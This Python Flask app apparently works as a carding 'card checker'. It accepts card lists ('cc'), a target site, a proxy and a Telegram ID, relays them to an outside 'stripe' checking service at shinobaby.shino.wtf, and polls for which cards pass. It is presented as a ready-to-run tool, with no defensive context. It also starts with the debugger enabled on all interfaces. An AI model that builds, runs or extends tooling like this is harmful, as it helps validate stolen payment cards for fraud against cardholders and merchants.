from flask import Flask, request, jsonify
import requests
import time
import os

app = Flask(__name__)

def process_check(site, lista, sec, tgid, speed_mode):
    postData = {
        "data": {
            "site": site,
            "lista": lista,
            "sec": sec,
            "tgid": tgid
        },
        "speed_mode": speed_mode
    }

    try:
        # Initial POST to start the process
        response = requests.post("https://shinobaby.shino.wtf/stripe", json=postData)
        response.raise_for_status()
        us = response.json().get('check_status_url')

        if not us:
            return {'error': 'No status URL returned'}, 500

        # Polling loop (30 attempts = 30 seconds max)
        for _ in range(30):
            status_res = requests.get(f'https://shinobaby.shino.wtf/{us}')
            status_data = status_res.json()
            result = status_data.get("result", {})
            message = result.get("message", "")
            tim = result.get("time", "")

            if message and message != "Request is being processed":
                return {
                    "result": message,
                    "time_taken": f"{tim}s"
                }, 200

            time.sleep(1)

        return {'error': 'Timed out waiting for response'}, 504

    except Exception as e:
        return {'error': 'bad request, try again after 120 seconds'}, 500

@app.route('/', methods=['GET', 'POST'])
def check_card():
    if request.method == 'POST':
        data = request.json or {}
    else:
        data = request.args or {}

    site = data.get('site')
    lista = data.get('cc')
    sec = data.get('proxy')
    tgid = data.get('tgid')  # now tgid is from param
    speed_mode = data.get('speed_mode', 'fast')

    if not all([site, lista, sec, tgid]):
        return jsonify({'error': 'Missing required parameters'}), 400

    result, status_code = process_check(site, lista, sec, tgid, speed_mode)
    return jsonify(result), status_code

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))  # Render sets $PORT env var
    app.run(host="0.0.0.0", port=port, debug=True)
